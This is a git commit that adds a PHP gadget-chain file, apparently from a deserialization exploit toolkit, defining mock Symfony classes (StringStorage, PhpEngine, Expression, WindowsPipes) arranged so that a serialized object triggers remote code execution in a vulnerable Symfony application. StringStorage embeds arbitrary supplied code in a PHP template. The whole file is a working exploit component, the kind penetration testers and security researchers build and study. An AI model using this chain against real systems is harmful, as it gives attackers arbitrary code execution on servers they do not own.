1c42102c07e8e2f817dec0e6b2e7d150756fc603
cr1f <35085741+cr1f@users.noreply.github.com>
2018-01-04 04:53:00 +0300

    Create gadgets.php

---
+++ gadgetchains/Symfony/RCE3/gadgets.php
@@ -0,0 +1,46 @@
+<?php
+
+namespace Symfony\Component\Templating\Storage{
+	class StringStorage{
+		protected $template = '';
+		public function __construct($code){
+			$this->template = '<?php '.$code.';die(); ?>';
+		}
+	}
+}
+
+namespace Symfony\Component\Templating{
+	class TemplateNameParser{}
+	class TemplateReference{}
+	class PhpEngine{
+		protected $parser;
+		protected $cache;
+		protected $current;
+		protected $globals = array();
+		public function __construct($s){
+			$this->parser = new TemplateNameParser;
+			$this->current = new TemplateReference;
+			$this->cache = array(NULL=>$s);
+		}
+	}
+}
+
+namespace Symfony\Component\Finder\Expression{
+	class Expression{
+		private $value;
+		public function __construct($p){
+			$this->value = $p;
+		}
+	}
+}
+
+namespace Symfony\Component\Process\Pipes{
+	class WindowsPipes{
+	    private $files = array();
+		public function __construct($e){
+			$this->files = array($e);
+		}	
+	}
+}
+
+?>
